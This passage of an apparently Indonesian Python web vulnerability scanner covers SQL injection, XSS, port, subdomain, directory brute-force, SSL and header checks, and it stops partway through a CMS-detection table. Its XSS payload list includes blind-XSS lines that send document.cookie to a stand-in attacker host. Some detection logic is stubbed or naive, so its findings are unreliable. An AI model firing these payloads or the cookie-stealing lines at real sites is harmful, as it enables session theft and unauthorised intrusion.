        print(f"\n{Colors.YELLOW}Total test points: {len(test_points)}{Colors.END}")
        print(f"{Colors.YELLOW}Estimated payloads: {total_tests}{Colors.END}\n")

        for point_name, point_value, point_type in test_points:
            print(f"\n{Colors.CYAN}Testing: {point_name} ({point_type}){Colors.END}")
            
            for category_name, category_data in payload_categories.items():
                print(f"  {Colors.YELLOW}→ {category_data['name']}{Colors.END}")
                
                for payload in category_data["payloads"]:
                    current_test += 1
                    Animations.progress(current_test, total_tests, f"Testing: {payload[:30]}...")
                    
                    try:
                        # Kirim request dengan payload
                        response = self.send_payload(point_name, point_value, payload, point_type)
                        
                        if response:
                            # Analisis response untuk deteksi kerentanan
                            analysis_result = self.analyze_response(response, payload, category_name)
                            
                            if analysis_result["vulnerable"]:
                                vulnerability_info = {
                                    "parameter": point_name,
                                    "payload": payload,
                                    "technique": category_data["name"],
                                    "db_type": analysis_result["db_type"],
                                    "confidence": analysis_result["confidence"],
                                    "evidence": analysis_result["evidence"],
                                    "response_time": analysis_result["response_time"]
                                }
                                
                                if vulnerability_info not in vulnerable_points:
                                    vulnerable_points.append(vulnerability_info)
                                    self.log_vulnerability_detail(vulnerability_info)
                    
                    except Exception as e:
                        continue

        # Tampilkan hasil akhir
        self.display_sql_injection_report(vulnerable_points)
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def extract_test_points(self):
        """Ekstrak semua titik testing dari URL dan form"""
        test_points = []
        parsed_url = urlparse(self.target_url)
        
        # Parameter dari URL
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            for key in params.keys():
                test_points.append((key, params[key][0], "GET"))
        
        # Cari form di halaman
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract form parameters
            forms = soup.find_all('form')
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').upper()
                
                inputs = form.find_all('input')
                for input_field in inputs:
                    if input_field.get('type') in ['text', 'password', 'hidden', 'email', 'search']:
                        input_name = input_field.get('name')
                        if input_name:
                            test_points.append((input_name, input_field.get('value', ''), f"FORM_{form_method}"))
        
        except:
            pass
        
        return test_points

    def send_payload(self, param_name, original_value, payload, param_type):
        """Kirim payload dan return response object"""
        try:
            if param_type == "GET":
                # Reconstruct URL dengan payload
                parsed_url = urlparse(self.target_url)
                params = parse_qs(parsed_url.query)
                params[param_name] = [payload]
                
                new_query = urlencode(params, doseq=True)
                target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                start_time = time.time()
                response = self.session.get(target_url, timeout=15, allow_redirects=False)
                response_time = time.time() - start_time
                
            else:  # FORM parameters
                # Implement form submission dengan payload
                pass
                
            response.response_time = response_time
            return response
            
        except Exception as e:
            return None

    def analyze_response(self, response, payload, technique):
        """Analisis mendalam response untuk deteksi SQL injection"""
        analysis = {
            "vulnerable": False,
            "db_type": "Unknown",
            "confidence": "Low",
            "evidence": "",
            "response_time": response.response_time
        }
        
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        # Pattern detection untuk berbagai database dan error
        db_patterns = {
            "MySQL": [
                r"mysql.*error", r"warning.*mysql", r"mysqli_", r"mysql_fetch",
                r"you have an error in your sql syntax", r"check the manual that corresponds to your mysql server version"
            ],
            "PostgreSQL": [
                r"postgresql.*error", r"warning.*pg_", r"postgres.query failed"
            ],
            "MSSQL": [
                r"microsoft sql server", r"sqlserver.*error", r"system.data.sqlclient",
                r"unclosed quotation mark", r"incorrect syntax near"
            ],
            "Oracle": [
                r"ora-[0-9]{5}", r"oracle.*error", r"oracle.*exception",
                r"pls-[0-9]{4}", r"oracle.jdbc"
            ]
        }
        
        # Deteksi berdasarkan error messages
        for db_type, patterns in db_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE) or re.search(pattern, headers, re.IGNORECASE):
                    analysis.update({
                        "vulnerable": True,
                        "db_type": db_type,
                        "confidence": "High",
                        "evidence": f"Database error detected: {db_type}"
                    })
                    return analysis
        
        # Time-based detection
        if technique == "TIME_BASED" and response.response_time > 5:
            analysis.update({
                "vulnerable": True,
                "db_type": "Detected via timing",
                "confidence": "Medium", 
                "evidence": f"Time delay detected: {response.response_time:.2f}s"
            })
            return analysis
        
        # Boolean-based detection (perbedaan content)
        if technique == "BOOLEAN_BASED":
            # Implementasi boolean-based detection dengan comparison
            pass
        
        # Union-based detection
        if technique == "UNION_BASED" and any(marker in content for marker in ['1', '2', '3', 'union']):
            analysis.update({
                "vulnerable": True,
                "db_type": "Union successful",
                "confidence": "High",
                "evidence": "Union query executed successfully"
            })
            return analysis
        
        return analysis

    def display_sql_injection_report(self, vulnerabilities):
        """Tampilkan laporan lengkap seperti sqlmap"""
        if not vulnerabilities:
            self.print_result("SQL Injection Scan", "Tidak ditemukan kerentanan SQL Injection", "success")
            return
        
        print(f"\n{Colors.RED}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                   SQL INJECTION REPORT                     ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        print(f"\n{Colors.YELLOW}Summary:{Colors.END}")
        print(f"  • Target URL: {self.target_url}")
        print(f"  • Vulnerabilities Found: {len(vulnerabilities)}")
        print(f"  • Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        print(f"\n{Colors.YELLOW}Vulnerability Details:{Colors.END}")
        
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"\n{Colors.CYAN}[{i}] {vuln['parameter']} - {vuln['technique']}{Colors.END}")
            print(f"    {Colors.WHITE}Payload: {vuln['payload']}{Colors.END}")
            print(f"    {Colors.WHITE}Database: {vuln['db_type']}{Colors.END}")
            print(f"    {Colors.WHITE}Confidence: {vuln['confidence']}{Colors.END}")
            print(f"    {Colors.WHITE}Evidence: {vuln['evidence']}{Colors.END}")
            
            # Rekomendasi berdasarkan tipe vulnerability
            recommendation = self.get_sql_injection_recommendation(vuln['technique'])
            print(f"    {Colors.GREEN}Recommendation: {recommendation}{Colors.END}")

    def get_sql_injection_recommendation(self, technique):
        """Berikan rekomendasi penanganan berdasarkan tipe SQL injection"""
        recommendations = {
            "Error-Based SQL Injection": "Gunakan prepared statements dan hindari menampilkan error database ke user",
            "Union-Based SQL Injection": "Validasi input dan gunakan parameterized queries",
            "Time-Based Blind SQLi": "Implementasi input validation dan query timeout",
            "Boolean-Based Blind SQLi": "Gunakan ORM atau stored procedures",
            "Stacked Queries": "Non-aktifkan multiple statements jika tidak diperlukan"
        }
        return recommendations.get(technique, "Gunakan parameterized queries dan input validation")

    def log_vulnerability_detail(self, vulnerability_info):
        """Log vulnerability dengan detail lengkap"""
        log_entry = {
            "type": "SQL Injection",
            "url": self.target_url,
            "parameter": vulnerability_info["parameter"],
            "payload": vulnerability_info["payload"],
            "technique": vulnerability_info["technique"],
            "database": vulnerability_info["db_type"],
            "confidence": vulnerability_info["confidence"],
            "evidence": vulnerability_info["evidence"],
            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
            "severity": "HIGH"
        }
        
        # Simpan ke file log
        with open("sql_injection_scan.log", "a") as f:
            f.write(json.dumps(log_entry) + "\n")
        
        # Tampilkan notifikasi real-time
        print(f"\n{Colors.RED}[VULNERABLE] {vulnerability_info['parameter']} - {vulnerability_info['technique']} ({vulnerability_info['confidence']}){Colors.END}")

    def xss_scan_advanced(self):
        self.banner()
        self.print_banner_section("ADVANCED XSS SCANNER")
        
        self.get_target()
        
        if not self.check_website_status():
            input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")
            return

        # Kategori payload yang lebih lengkap
        payloads = [
            # Basic XSS Payloads
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            
            # Image-based XSS
            "<img src=x onerror=alert('XSS')>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<img src=x onerror=alert(document.cookie)>",
            "<img src=x onerror=prompt('XSS')>",
            "<img src=x onerror=confirm('XSS')>",
            
            # SVG XSS
            "<svg onload=alert('XSS')>",
            "<svg onload=alert(document.domain)>",
            "<svg/onload=alert('XSS')>",
            
            # Body XSS
            "<body onload=alert('XSS')>",
            "<body onpageshow=alert('XSS')>",
            
            # Iframe XSS
            "<iframe src=javascript:alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<iframe onload=alert('XSS')>",
            
            # Input XSS
            "<input onfocus=alert('XSS') autofocus>",
            "<input onblur=alert('XSS') autofocus><input autofocus>",
            "<input onmouseover=alert('XSS')>",
            
            # Video/Audio XSS
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            
            # Math XSS
            "<math href=javascript:alert('XSS')>CLICK",
            
            # Link XSS
            "<a href=javascript:alert('XSS')>Click</a>",
            "<a href=\"javascript:alert('XSS')\">Click</a>",
            
            # Form XSS
            "<form action=javascript:alert('XSS')><input type=submit>",
            "<form onsubmit=alert('XSS')><input type=submit>",
            
            # Event Handler XSS
            "\" onmouseover=\"alert('XSS')\"",
            "' onfocus='alert(\"XSS\")'",
            "` onload=`alert('XSS')`",
            " onmouseenter=alert('XSS')",
            
            # JavaScript Protocol XSS
            "javascript:alert('XSS')",
            "javascript:alert(document.domain)",
            "javascript:alert(document.cookie)",
            "javascript:prompt('XSS')",
            "javascript:confirm('XSS')",
            
            # Encoded XSS
            "javascript:alert(String.fromCharCode(88,83,83))",
            "javascript:alert(atob('WFNT'))",
            
            # Obfuscated XSS
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<sc<script>ript>alert('XSS')</sc</script>ript>",
            "<img src=x o&#110;error=alert('XSS')>",
            
            # DOM-based XSS Payloads
            "#<script>alert('XSS')</script>",
            "?param=<script>alert('XSS')</script>",
            
            # Advanced Event Handlers
            "<details ontoggle=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            
            # CSS XSS
            "<div style=\"background:url(javascript:alert('XSS'))\">",
            "<link rel=stylesheet href=\"javascript:alert('XSS')\">",
            
            # Template Injection XSS
            "${alert('XSS')}",
            "#{alert('XSS')}",
            "{{alert('XSS')}}",
            
            # Unicode XSS
            "<img src=x onerror=alert('XSS')>",
            "＜script＞alert('XSS')＜/script＞",
            
            # Polyglot XSS
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e",
            
            # Blind XSS Payloads
            "<script>fetch('http://your-server.com/?c='+document.cookie)</script>",
            "<img src=x onerror=\"fetch('http://your-server.com/?c='+btoa(document.cookie))\">",
            "<script>var i=new Image;i.src='http://your-server.com/?c='+document.cookie;</script>"
        ]

        print(f"\n{Colors.YELLOW}Memulai Advanced XSS Scan...{Colors.END}")
        print(f"{Colors.CYAN}Target: {self.target_url}{Colors.END}")
        print(f"{Colors.CYAN}Total Payloads: {len(payloads)}{Colors.END}")
        
        Animations.scan_animation()

        vulnerable_params = []
        tested_urls = set()
        parsed_url = urlparse(self.target_url)
        
        # Test URL parameters
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            for key in params.keys():
                for payload in Animations.progress_bar(payloads, f"Testing parameter: {key}"):
                    test_url = f"{self.target_url.split('?')[0]}?{key}={quote(payload)}"
                    
                    if test_url in tested_urls:
                        continue
                    tested_urls.add(test_url)
                    
                    try:
                        response = self.session.get(test_url, timeout=8, verify=False)
                        response_content = response.text.lower()
                        
                        # Enhanced detection patterns
                        detection_patterns = [
                            payload.lower() in response_content,
                            "<script>" in response_content and "alert" in response_content,
                            "onerror" in response_content and "alert" in response_content,
                            "onload" in response_content and "alert" in response_content,
                            "javascript:" in response_content and "alert" in response_content,
                            "document.cookie" in response_content,
                            "prompt(" in response_content,
                            "confirm(" in response_content,
                            "xss" in response_content and any(tag in response_content for tag in ["<script>", "onerror", "onload"])
                        ]
                        
                        if any(detection_patterns):
                            if (key, payload) not in vulnerable_params:
                                vulnerable_params.append((key, payload))
                                self.log_vulnerability(
                                    "Cross-Site Scripting (XSS)", 
                                    f"Parameter: {key}\nURL: {test_url}\nPayload: {payload}", 
                                    "HIGH",
                                    f"Response length: {len(response.text)}"
                                )
                                print(f"{Colors.RED}[VULNERABLE] Parameter: {key} - Payload: {payload[:50]}...{Colors.END}")
                                
                    except requests.exceptions.Timeout:
                        print(f"{Colors.YELLOW}[TIMEOUT] {test_url}{Colors.END}")
                        continue
                    except Exception as e:
                        print(f"{Colors.YELLOW}[ERROR] {test_url} - {str(e)}{Colors.END}")
                        continue

        # Test POST parameters if form detected
        print(f"\n{Colors.CYAN}Testing POST parameters...{Colors.END}")
        try:
            response = self.session.get(self.target_url, timeout=5)
            forms = self.extract_forms(response.text)
            
            for form in forms:
                form_details = self.parse_form(form)
                for input_field in form_details["inputs"]:
                    if input_field["type"] in ["text", "search", "email", "url", "password"]:
                        for payload in Animations.progress_bar(payloads[:20], f"Testing form input: {input_field['name']}"):
                            try:
                                data = {}
                                for field in form_details["inputs"]:
                                    if field["name"] == input_field["name"]:
                                        data[field["name"]] = payload
                                    else:
                                        data[field["name"]] = "test"
                                
                                if form_details["method"] == "post":
                                    response = self.session.post(
                                        urljoin(self.target_url, form_details["action"]),
                                        data=data,
                                        timeout=8
                                    )
                                else:
                                    response = self.session.get(
                                        urljoin(self.target_url, form_details["action"]),
                                        params=data,
                                        timeout=8
                                    )
                                
                                if payload in response.text:
                                    if (f"FORM:{input_field['name']}", payload) not in vulnerable_params:
                                        vulnerable_params.append((f"FORM:{input_field['name']}", payload))
                                        self.log_vulnerability(
                                            "Cross-Site Scripting (XSS) - FORM", 
                                            f"Form Field: {input_field['name']}\nAction: {form_details['action']}\nPayload: {payload}", 
                                            "HIGH"
                                        )
                                        
                            except Exception as e:
                                continue
                                
        except Exception as e:
            print(f"{Colors.YELLOW}[WARNING] Form testing skipped: {str(e)}{Colors.END}")

        # Test headers for reflected values
        print(f"\n{Colors.CYAN}Testing HTTP Headers...{Colors.END}")
        header_payloads = [
            "<script>alert('XSS')</script>",
            "\" onmouseover=\"alert('XSS')\"",
            "${alert('XSS')}"
        ]
        
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        for header in headers_to_test:
            for payload in header_payloads:
                try:
                    headers = {header: payload}
                    response = self.session.get(self.target_url, headers=headers, timeout=5)
                    
                    if payload in response.text:
                        vulnerable_params.append((f"HEADER:{header}", payload))
                        self.log_vulnerability(
                            "Cross-Site Scripting (XSS) - Header", 
                            f"Header: {header}\nPayload: {payload}", 
                            "MEDIUM"
                        )
                        
                except Exception:
                    continue

        # Results summary
        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
        if not vulnerable_params:
            self.print_result("Advanced XSS Scan", "Tidak ditemukan kerentanan XSS", "success")
        else:
            self.print_result("Advanced XSS Scan", f"Ditemukan {len(vulnerable_params)} kerentanan XSS!", "critical")
            
            print(f"\n{Colors.RED}{Colors.BOLD}DETAIL KERENTANAN:{Colors.END}")
            for i, (param, payload) in enumerate(vulnerable_params, 1):
                print(f"{Colors.RED}{i}. Parameter: {param}{Colors.END}")
                print(f"   Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")
                print()

        # Recommendations
        print(f"{Colors.CYAN}{Colors.BOLD}REKOMENDASI PERBAIKAN:{Colors.END}")
        recommendations = [
            "✅ Implementasi Content Security Policy (CSP)",
            "✅ Validasi dan sanitasi semua input user",
            "✅ Encode output sebelum ditampilkan ke browser",
            "✅ Gunakan HTTPOnly flag untuk cookies",
            "✅ Gunakan library templating yang aman",
            "✅ Implementasi X-XSS-Protection header",
            "✅ Lakukan security testing secara berkala"
        ]
        
        for rec in recommendations:
            print(f"  {rec}")

        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def extract_forms(self, html):
        """Extract forms from HTML content"""
        forms = []
        soup = BeautifulSoup(html, 'html.parser')
        for form in soup.find_all('form'):
            forms.append(str(form))
        return forms

    def parse_form(self, form_html):
        """Parse form HTML to extract details"""
        soup = BeautifulSoup(form_html, 'html.parser')
        form = soup.find('form')
        
        form_details = {
            "action": form.get('action', ''),
            "method": form.get('method', 'get').lower(),
            "inputs": []
        }
        
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_details = {
                "type": input_tag.get('type', 'text'),
                "name": input_tag.get('name', ''),
                "value": input_tag.get('value', '')
            }
            form_details["inputs"].append(input_details)
        
        return form_details

    def port_scanner_comprehensive(self):
        self.banner()
        self.print_banner_section("COMPREHENSIVE PORT SCANNER")
        
        target = input(f"{Colors.CYAN}🎯 Masukkan host/domain atau IP: {Colors.END}").strip()
        

        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            443: "HTTPS",
            993: "IMAPS",
            995: "POP3S",
            1433: "MSSQL",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            5900: "VNC",
            6379: "Redis",
            27017: "MongoDB",
            8080: "HTTP-Alt",
            8443: "HTTPS-Alt",
            9200: "Elasticsearch"
        }

        print(f"\n{Colors.YELLOW}Memulai Comprehensive Port Scanning...{Colors.END}")
        print(f"{Colors.CYAN}Target: {target}{Colors.END}\n")

        open_ports = []

        def scan_port(port, service):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, port))
                sock.close()
                if result == 0:
                    open_ports.append((port, service))
                    self.print_result(f"Port {port} terbuka", service, "success")
                else:
                    self.print_result(f"Port {port}", "Closed", "info", 1)
            except Exception as e:
                self.print_result(f"Port {port}", f"Error: {str(e)}", "error", 1)

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(scan_port, port, service) for port, service in common_ports.items()]
            concurrent.futures.wait(futures)

        if open_ports:
            self.print_result("Port Scanning", f"Ditemukan {len(open_ports)} port terbuka", "success")
            
            risky_ports = [22, 23, 21, 3389, 5900] 
            for port, service in open_ports:
                if port in risky_ports:
                    self.log_vulnerability(
                        "Risky Service Exposure", 
                        f"Port {port} ({service}) terbuka - berisiko terhadap serangan", 
                        "MEDIUM"
                    )
        else:
            self.print_result("Port Scanning", "Tidak ada port terbuka yang ditemukan", "warning")

        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def dns_whois_lookup_detailed(self):
        self.banner()
        self.print_banner_section("DETAILED DNS & WHOIS LOOKUP")
        
        domain = input(f"{Colors.CYAN}🌐 Masukkan domain: {Colors.END}").strip()
        
        print(f"\n{Colors.YELLOW}Melakukan Detailed DNS Analysis...{Colors.END}")
        Animations.loading_animation("Querying DNS records", 3)

        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR', 'SRV']
        
        dns_info = {}
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                dns_info[record_type] = [str(rdata) for rdata in answers]
                for rdata in answers:
                    self.print_result(f"DNS {record_type}", str(rdata), "info")
            except Exception as e:
                self.print_result(f"DNS {record_type}", f"Tidak ditemukan - {str(e)}", "warning")


        print(f"\n{Colors.YELLOW}Melakukan WHOIS Analysis...{Colors.END}")
        try:
            whois_result = subprocess.check_output(['whois', domain], stderr=subprocess.STDOUT, text=True, timeout=10)
            
   
            whois_data = {
                'Registrar': re.findall(r'Registrar:\s*(.+)', whois_result),
                'Creation Date': re.findall(r'Creation Date:\s*(.+)', whois_result),
                'Expiration Date': re.findall(r'Expir.*Date:\s*(.+)', whois_result),
                'Name Server': re.findall(r'Name Server:\s*(.+)', whois_result),
                'Status': re.findall(r'Status:\s*(.+)', whois_result),
                'Registrant': re.findall(r'Registrant:\s*(.+)', whois_result)
            }
            
            for key, values in whois_data.items():
                if values:
                    for value in values[:2]: 
                        self.print_result(f"WHOIS {key}", value.strip(), "info")
                        
        except subprocess.TimeoutExpired:
            self.print_result("WHOIS", "Timeout - informasi terlalu besar", "warning")
        except Exception as e:
            self.print_result("WHOIS", f"Gagal: {str(e)}", "error")

 
        if 'TXT' in dns_info:
            for txt_record in dns_info['TXT']:
                if 'spf' in txt_record.lower():
                    self.print_result("SPF Record", "Ditemukan - Email protection active", "success")
                if 'dmarc' in txt_record.lower():
                    self.print_result("DMARC Record", "Ditemukan - Email security active", "success")

        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def ssl_checker_deep(self):
        self.banner()
        self.print_banner_section("DEEP SSL/TLS ANALYSIS")
        
        self.get_target()
        
        try:
            hostname = urlparse(self.target_url).hostname
            if not hostname:
                self.print_result("SSL Check", "Hostname tidak valid", "error")
                return

            print(f"\n{Colors.YELLOW}Melakukan Deep SSL/TLS Analysis...{Colors.END}")
            Animations.loading_animation("Analyzing SSL certificate", 3)

            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                 
                    self.print_result("SSL Certificate", "Valid", "success")
                    self.print_result("Subject", str(cert.get('subject', 'Tidak diketahui')), "info")
                    self.print_result("Issuer", str(cert.get('issuer', 'Tidak diketahui')), "info")
                    self.print_result("Cipher", f"{cipher[0]} - {cipher[1]}", "info")
                    self.print_result("Protocol", ssock.version(), "info")
                    
            
                    not_after = cert.get('notAfter', '')
                    if not_after:
                        expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        days_remaining = (expiry_date - datetime.now()).days
                        
                        if days_remaining > 90:
                            self.print_result("Certificate Expiry", f"{days_remaining} hari lagi", "success")
                        elif days_remaining > 30:
                            self.print_result("Certificate Expiry", f"{days_remaining} hari lagi - Perlu diperbarui", "warning")
                        else:
                            self.print_result("Certificate Expiry", f"Hampir kadaluarsa: {days_remaining} hari", "critical")
                    
                
                    extensions = cert.get('subjectAltName', [])
                    if extensions:
                        self.print_result("Subject Alt Names", f"{len(extensions)} domains", "info")
                    
             
                    weak_protocols = ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']
                    if ssock.version() in weak_protocols:
                        self.log_vulnerability(
                            "Weak SSL Protocol", 
                            f"Menggunakan {ssock.version()} - rentan terhadap serangan", 
                            "HIGH"
                        )
                    
        except ssl.SSLCertVerificationError as e:
            self.log_vulnerability("SSL Certificate Error", f"Verifikasi gagal: {str(e)}", "HIGH")
        except Exception as e:
            self.print_result("SSL Check", f"Gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")


    def directory_file_bruteforce(self):
        self.banner()
        self.print_banner_section("DIRECTORY & FILE BRUTEFORCE")
        
        self.get_target()
        
        if not self.check_website_status():
            input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")
            return

      
        common_paths = [
     
            'admin', 'administrator', 'login', 'wp-admin', 'phpmyadmin', 'cpanel', 'webmail',
            'backend', 'dashboard', 'manager', 'system', 'control',
      
            'config.php', 'config.php.bak', 'configuration.php', 'settings.php',
            '.env', 'config.json', 'config.xml', 'web.config',
            'backup.zip', 'backup.sql', 'dump.sql', 'database.sql',
      
            'uploads', 'images', 'css', 'js', 'assets', 'static', 'media',
            'tmp', 'temp', 'cache', 'logs', 'backup', 'backups', 'old',
       
            'api', 'v1', 'v2', 'graphql', 'swagger', 'redoc', 'docs',
            'test', 'dev', 'development', 'staging', 'debug',
       
            'laravel', 'wordpress', 'drupal', 'joomla', 'magento',
            '.git', '.svn', '.htaccess', 'robots.txt', 'sitemap.xml'
        ]

        print(f"\n{Colors.YELLOW}Memulai Directory & File Bruteforce...{Colors.END}")
        Animations.scan_animation()

        found_paths = []

        def check_path(path):
            test_url = urljoin(self.target_url, path)
            try:
                response = self.session.get(test_url, timeout=5, allow_redirects=False)
                if response.status_code in [200, 301, 302, 403]:
                    found_paths.append((path, response.status_code))
                    status_color = Colors.GREEN if response.status_code == 200 else Colors.YELLOW
                    status_text = "FOUND" if response.status_code == 200 else "RESTRICTED"
                    print(f"{status_color}  [{response.status_code}] {status_text}: {test_url}{Colors.END}")
                    
         
                    sensitive_paths = ['config', '.env', '.git', 'backup', 'admin']
                    if any(sensitive in path for sensitive in sensitive_paths):
                        self.log_vulnerability(
                            "Sensitive Path Exposure", 
                            f"Path {path} dapat diakses - berisiko informasi暴露", 
                            "MEDIUM"
                        )
            except:
                pass

 
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(check_path, path) for path in common_paths]
            concurrent.futures.wait(futures)

        if found_paths:
            self.print_result("Bruteforce", f"Ditemukan {len(found_paths)} path yang dapat diakses", "success")
        else:
            self.print_result("Bruteforce", "Tidak ada path yang ditemukan", "warning")

        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")


    def subdomain_scanner_massive(self):
        self.banner()
        self.print_banner_section("MASSIVE SUBDOMAIN SCANNER")
        
        domain = input(f"{Colors.CYAN}🌍 Masukkan domain (contoh: example.com): {Colors.END}").strip()
        
   
        subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
            'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn',
            'api', 'apps', 'app', 'secure', 'demo', 'portal', 'shop', 'store',
            'cdn', 'static', 'media', 'images', 'img', 'js', 'css', 'assets',
            'email', 'web', 'support', 'help', 'docs', 'wiki', 'status',
            'shop', 'store', 'payment', 'billing', 'account', 'client',
            'staging', 'prod', 'production', 'testing', 'dev', 'development',
            'db', 'database', 'sql', 'mysql', 'postgres', 'mongodb',
            'redis', 'memcached', 'elasticsearch', 'kibana', 'grafana',
            'jenkins', 'git', 'svn', 'docker', 'kubernetes', 'aws', 'azure'
        ]

        print(f"\n{Colors.YELLOW}Memulai Massive Subdomain Scanning...{Colors.END}")
        Animations.scan_animation()

        found_subdomains = []

        def check_subdomain(subdomain):
            full_domain = f"{subdomain}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                found_subdomains.append((full_domain, ip))
                self.print_result(f"Subdomain ditemukan", f"{full_domain} -> {ip}", "success")
            except:
                pass

    
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_subdomain, subdomain) for subdomain in subdomains]
            concurrent.futures.wait(futures)

        if found_subdomains:
            self.print_result("Subdomain Scan", f"Ditemukan {len(found_subdomains)} subdomain", "success")
            
          
            for subdomain, ip in found_subdomains:
                if any(risk in subdomain for risk in ['admin', 'test', 'dev', 'staging', 'backup']):
                    self.log_vulnerability(
                        "Risky Subdomain Exposure", 
                        f"Subdomain {subdomain} terbuka - berisiko terhadap serangan", 
                        "MEDIUM"
                    )
        else:
            self.print_result("Subdomain Scan", "Tidak ada subdomain yang ditemukan", "warning")

        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

    def header_security_check_complete(self):
        self.banner()
        self.print_banner_section("COMPLETE HEADER SECURITY CHECK")
        
        self.get_target()
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            
         
            security_headers = {
                'X-Frame-Options': 'Melindungi dari clickjacking',
                'X-Content-Type-Options': 'Mencegah MIME sniffing',
                'X-XSS-Protection': 'Proteksi XSS browser',
                'Strict-Transport-Security': 'HTTP Strict Transport Security',
                'Content-Security-Policy': 'Content Security Policy',
                'Referrer-Policy': 'Kontrol referrer information',
                'Permissions-Policy': 'Permissions Policy (formerly Feature-Policy)',
                'X-Permitted-Cross-Domain-Policies': 'Cross-domain policy',
                'X-Download-Options': 'Prevent file download opening',
                'X-Robots-Tag': 'Control search engine indexing'
            }

            print(f"\n{Colors.YELLOW}Security Headers Analysis:{Colors.END}\n")
            
            security_score = 0
            total_headers = len(security_headers)
            
            for header, description in security_headers.items():
                if header in headers:
                    security_score += 1
                    self.print_result(header, f"{headers[header]} - {description}", "success")
                else:
                    self.print_result(header, f"Tidak ada - {description}", "error")
            
  
            security_percentage = (security_score / total_headers) * 100
            print(f"\n{Colors.CYAN}Security Headers Score: {security_score}/{total_headers} ({security_percentage:.1f}%){Colors.END}")
            
            if security_percentage >= 80:
                self.print_result("Overall Security", "Excellent", "success")
            elif security_percentage >= 60:
                self.print_result("Overall Security", "Good", "warning")
            else:
                self.print_result("Overall Security", "Poor - Perbaiki security headers", "critical")
            
            print(f"\n{Colors.YELLOW}Server Information:{Colors.END}")
            for header in ['Server', 'X-Powered-By', 'X-AspNet-Version']:
                if header in headers:
                    self.print_result(header, headers[header], "info")
                    
        except Exception as e:
            self.print_result("Header Check", f"Gagal: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")

 
    def cms_technology_detection(self):
        self.banner()
        self.print_banner_section("CMS & TECHNOLOGY DETECTION")
        
        self.get_target()
        
        if not self.check_website_status():
            input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")
            return

        print(f"\n{Colors.YELLOW}Detecting CMS & Technologies...{Colors.END}")
        Animations.loading_animation("Analyzing technologies", 3)

        try:
            response = self.session.get(self.target_url, timeout=10)
            
      
            cms_patterns = {
                'WordPress': [r'wp-content', r'wp-includes', r'wordpress', r'/wp-json/'],
                'Joomla': [r'joomla', r'media/jui', r'/components/com_'],
                'Drupal': [r'drupal', r'sites/all/', r'/sites/default/'],
                'Magento': [r'magento', r'static/frontend', r'/skin/frontend/'],
